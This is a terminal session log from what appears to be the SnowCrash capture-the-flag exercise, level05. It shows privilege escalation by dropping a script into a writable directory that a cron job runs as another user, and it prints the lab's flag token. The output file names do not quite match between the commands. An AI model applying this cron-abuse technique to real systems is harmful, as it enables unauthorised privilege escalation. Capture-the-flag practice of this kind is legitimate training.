```shell
level05@SnowCrash:/var/tmp$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/var/tmp$ cd /usr/sbin
level05@SnowCrash:/usr/sbin$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:/usr/sbin$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ ls -la
total 0
drwxrwxr-x+ 2 root root 40 Mar 31 18:40 .
drwxr-xr-x  1 root root 60 Mar 31 09:43 ..
level05@SnowCrash:/opt/openarenaserver$ vim script.sh && chmod +x script.shlevel05@SnowCrash:/opt/openarenaserver$ cat script.sh && ls -la
#!/bin/bash
echo `getflag` > /tmp/flag05
total 4
drwxrwxr-x+ 2 root    root    60 Mar 31 18:51 .
drwxr-xr-x  1 root    root    60 Mar 31 09:43 ..
-rwxrwxr-x+ 1 level05 level05 59 Mar 31 18:51 script.sh
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
